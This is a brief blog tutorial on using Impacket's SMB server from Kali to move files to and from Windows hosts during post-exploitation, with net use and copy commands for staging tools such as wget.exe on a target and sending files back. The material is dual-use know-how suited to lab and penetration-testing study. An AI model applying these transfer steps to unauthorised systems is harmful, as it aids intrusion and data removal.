---
layout: mypost
title: 'Impacket: SMB Transfer'
categories: [Tools]
---


## The power of Impacket

Often times during a Post-Exploitation phase, the box or an exercise we need to access certain Windows (mostly) machines that **don't** have internet or any way to transfer a file back to our Kali machine.

There are many other ways and techniques to transfer files (that i'll cover in another post) but so far this is the most successful one for me, so feel free to use the one that suits you best. 

To help with that we have an awesome suite called [Impacket](https://github.com/fortra/impacket).

> Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object-oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.


There's no need for installation since it's already include in Kali.

## Creating a SMB server:


```bash
root@kali:~# impacket-smbserver share /path/you/want --smb2support
```

We use *--smbsupport* because sometimes gives you an error for SMB1.

Example:

```bash
root@kali:~# impacket-smbserver anakin /home/kali/offsec/tools -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Config file parsed
[*] User OFFICE\offsec authenticated successfully
```


## Connecting to our share

Once the server is estabilished, we go over to the Windows machine and connect back to our share like this:

```bash
C:\>net use \\10.11.0.XXX\anakin 
The command completed successfully.
```

## Transfering files


To transfer files just use the command copy. It works both ways.

```bash
C:\>copy \\10.11.0.XXX\anakin\wget.exe \users\offsec\desktop\wget.exe
1 file(s) copied.
```


## Creating a shared/drive folder

We also can use the option `p:` to create a drive folder which we can have access to. Like this you can drag and drop anything you want inside the shared folder.


```bash
C:\>net use p: \\10.11.0.XXX\anakin 
The command completed successfully.
```


> This is very bad for OPSEC, it's not recommended. If you do, consider disconnecting from the driver using the following: `C:\>net use /d \\[host]\[share name]`



And that's pretty much it! Very quick and simple.

<br>
**Happy hacking!**


![kamusari](/assets/img/smb/kamusari.png)
